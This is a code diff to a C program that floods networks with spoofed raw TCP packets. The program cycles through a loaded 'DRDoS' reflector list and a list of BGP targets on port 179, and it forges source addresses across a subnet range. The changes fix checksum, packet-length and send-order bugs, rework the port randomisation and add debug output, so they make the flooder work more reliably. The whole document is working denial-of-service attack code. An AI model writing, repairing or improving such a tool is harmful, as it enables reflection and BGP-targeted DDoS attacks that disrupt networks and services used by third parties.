@@ -304,41 +304,60 @@ void *flood(void *par1)
 	while (1)
 	{
 		tcph->check = 0;
+		iph->check = 0;
 		int bpgOrDrd = randnum(0, 1);
 
 		if (bpgOrDrd == 1)
 		{
 			bgph->type = randnum(1, 4);
-			if (bpg_list_node == NULL)
-			{
-				bpg_list_node = td->bpg_list_node;
-			}
-			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&bpg_list_node->data, sizeof(bpg_list_node->data));
+
 			setup_bgp_header(bgph);
 			tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct bgp_header)) / 4;
 			tcph->dest = htons(179);
 			tcph->source = htons(179);
 			bpg_list_node = bpg_list_node->next;
 			iph->daddr = bpg_list_node->data.sin_addr.s_addr;
+			iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct bgp_header);
 			tcph->check = tcpcsum(iph, tcph, sizeof(struct bgp_header));
+			sendto(s, datagram, iph->tot_len, 0,
+				   (struct sockaddr *)&bpg_list_node->data, sizeof(bpg_list_node->data));
 		}
 		else
 		{
 			opts->mssvalue = htons(1360 + (rand_cmwc() % 100));
-			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data, sizeof(list_node->data));
 			setup_tcpopts_header(opts);
 			tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpOptions)) / 4;
 			tcph->dest = htons(sPorts[rand_cmwc() % 2]);
 			list_node = list_node->next;
 			iph->daddr = list_node->data.sin_addr.s_addr;
+			iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
 			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data, sizeof(list_node->data));
 			if (floodport == 0)
 			{
-				tcph->source = htons(randnum(1, 65535));
+				if (randnum(0, 1) == 1)
+				{
+					tcph->dest = htons(randnum(1, 65535));
+					tcph->source = htons(sPorts[rand_cmwc() % 2]);
+				}
+				else
+				{
+					tcph->dest = htons(sPorts[rand_cmwc() % 2]);
+					tcph->source = htons(randnum(1, 65535));
+				}
 			}
 			else
 			{
-				tcph->source = htons(dPorts[rand_cmwc() % 3]);
+				if (randnum(0, 1) == 1)
+				{
+					tcph->dest = htons(floodport);
+					tcph->source = htons(dPorts[rand_cmwc() % 3]);
+				}
+				else
+				{
+					tcph->source = htons(floodport);
+					tcph->dest = htons(sPorts[rand_cmwc() % 2]);
+				}
 			}
 		}
 
@@ -350,6 +369,7 @@ void *flood(void *par1)
 		tcph->window = htons(windows[rand_cmwc() % 4]);
 
 		// printf("Source IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->saddr));
+		// printf("Dst IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->daddr));
 
 		pps++;
 
@@ -366,11 +386,13 @@ void *flood(void *par1)
 		}
 	}
 }
-void extractIpOctets(unsigned char *sourceString, short *ipAddress)
+void extractIpOctets(const char *sourceString, short *ipAddress)
 {
+	memset(ipAddress, 0, 4);
 	unsigned short len = 0;
 	unsigned char oct[4] = {0}, cnt = 0, cnt1 = 0, i, buf[5];
 
+	printf("Parsing IP: %s\n", sourceString);
 	len = strlen(sourceString);
 	for (i = 0; i < len; i++)
 	{
@@ -389,6 +411,9 @@ void extractIpOctets(unsigned char *sourceString, short *ipAddress)
 	ipAddress[1] = oct[1];
 	ipAddress[2] = oct[2];
 	ipAddress[3] = oct[3];
+	printf("Parsed octets: %d.%d.%d.%d\n",
+		   ipAddress[0], ipAddress[1],
+		   ipAddress[2], ipAddress[3]); // Debug output
 }
 
 unsigned int ip2ui(char *ip)
@@ -412,22 +437,15 @@ unsigned int ip2ui(char *ip)
 	return ipAsUInt;
 }
 
-char *ui2ip(unsigned int ipAsUInt)
+char *ui2ip(unsigned int ip)
 {
-	char *ip = malloc(16 * sizeof(char));
-	int exponent;
-	for (exponent = 3; exponent >= 0; --exponent)
-	{
-		int r = ipAsUInt / pow(256, exponent);
-		char buf[4];
-		sprintf(buf, "%d", r);
-		strcat(ip, buf);
-		strcat(ip, ".");
-		ipAsUInt -= r * pow(256, exponent);
-	}
-	/* Replace last dot with '\0'. */
-	ip[strlen(ip) - 1] = 0;
-	return ip;
+	static char ipstr[16];
+	snprintf(ipstr, sizeof(ipstr), "%u.%u.%u.%u",
+			 (ip >> 24) & 0xFF,
+			 (ip >> 16) & 0xFF,
+			 (ip >> 8) & 0xFF,
+			 ip & 0xFF);
+	return ipstr;
 }
 
 unsigned int createBitmask(const char *bitmask)
@@ -446,24 +464,43 @@ unsigned int createBitmask(const char *bitmask)
 }
 struct list *loadList(const char *filename, size_t max_len, int *out_count)
 {
+	printf("DEBUG: Entering loadList for file: %s\n", filename); // Debug 1
 	FILE *file = fopen(filename, "r");
 	if (!file)
 	{
 		fprintf(stderr, "Error opening file: %s\n", filename);
 		return NULL;
 	}
+	printf("DEBUG: File opened successfully\n"); // Debug 2
 
 	struct list *head = NULL, *tail = NULL;
 	char buffer[128];
+	int line_count = 0;
 
 	while (fgets(buffer, sizeof(buffer), file))
 	{
-		if (buffer[strlen(buffer) - 1] == '\n' || buffer[strlen(buffer) - 1] == '\r')
-			buffer[strlen(buffer) - 1] = '\0';
+		line_count++;
+
+		// Clean the line
+		buffer[strcspn(buffer, "\r\n")] = 0;
 
 		struct list *new_node = (struct list *)malloc(sizeof(struct list));
+		if (!new_node)
+		{
+			fprintf(stderr, "Memory allocation failed\n");
+			break;
+		}
 		memset(new_node, 0, sizeof(struct list));
+
+		new_node->data.sin_family = AF_INET;
 		new_node->data.sin_addr.s_addr = inet_addr(buffer);
+		if (new_node->data.sin_addr.s_addr == INADDR_NONE)
+		{
+			printf("DEBUG: Invalid IP address: %s\n", buffer); // Debug 5
+			free(new_node);
+			continue;
+		}
+
 		new_node->next = NULL;
 
 		if (!head)
@@ -483,8 +520,12 @@ struct list *loadList(const char *filename, size_t max_len, int *out_count)
 	}
 
 	fclose(file);
+	if (out_count)
+		*out_count = line_count;
+	printf("DEBUG: Loaded %d IPs from %s\n", line_count, filename); // Debug 8
 	return head;
 }
+
 int main(int argc, char *argv[])
 {
 	if (argc < 8)
@@ -495,6 +536,8 @@ int main(int argc, char *argv[])
 	}
 	srand(time(NULL));
 	fprintf(stdout, "Preparing...\n");
+	printf("DEBUG: Starting initialization\n"); // Debug 9
+
 	int max_len = 128;
 	int i = 0;
 	char *buffer = (char *)malloc(max_len);
@@ -507,8 +550,21 @@ int main(int argc, char *argv[])
 	limiter = 0;
 	pps = 0;
 	int count = 0;
+
+	printf("DEBUG: Before loading DRDoS list\n"); // Debug 10
 	list_t *current = loadList(argv[6], max_len, &count);
+	printf("DEBUG: After loading DRDoS list, count=%d\n", count); // Debug 11
+
+	printf("DEBUG: Before loading BGP list\n"); // Debug 12
 	bpg_list *bgpCurr = loadList(argv[7], max_len, &count);
+	printf("DEBUG: After loading BGP list, count=%d\n", count); // Debug 13
+
+	// Check if lists loaded successfully
+	if (!current || !bgpCurr)
+	{
+		fprintf(stderr, "Failed to load one or both IP lists\n");
+		exit(-1);
+	}
 
 	pthread_t thread[num_threads];
 	char *ip, *bitmask;
@@ -541,6 +597,7 @@ int main(int argc, char *argv[])
 	short network_octets[4], broadcast_octets[4];
 	extractIpOctets(networkAddress, network_octets);
 	extractIpOctets(broadcastAddress, broadcast_octets);
+
 	int ips = 0;
 
 	for (int a = network_octets[0]; a <= broadcast_octets[0]; a++)
@@ -556,7 +613,7 @@ int main(int argc, char *argv[])
 					snprintf(ipAddr, 16, "%d.%d.%d.%d", a, b, c, d); // Format the IP string from the individual octets
 					sins[ips].sin_addr.s_addr = inet_addr(ipAddr);	 // Set the IP address as the packet source address for this socket
 					ips++;
-					// printf("%d: %s\n", ips, ipAddr);
+					printf("%d: %s\n", ips, ipAddr);
 				}
 			}
 		}
@@ -570,9 +627,14 @@ int main(int argc, char *argv[])
 		td[i].thread_id = i;
 		td[i].sins = sins;
 		td[i].num_ips = ips;
-		td[i].list_node = current;
-		td[i].bpg_list_node = bgpCurr;
-		pthread_create(&thread[i], NULL, &flood, (void *)&td[i]);
+		td[i].list_node = current;	   // All threads start at head
+		td[i].bpg_list_node = bgpCurr; // All threads start at head
+
+		if (pthread_create(&thread[i], NULL, &flood, (void *)&td[i]) != 0)
+		{
+			fprintf(stderr, "Failed to create thread\n");
+			exit(-1);
+		}
 	}
 
 	for (i = 0; i < (atoi(argv[5]) * multiplier); i++)
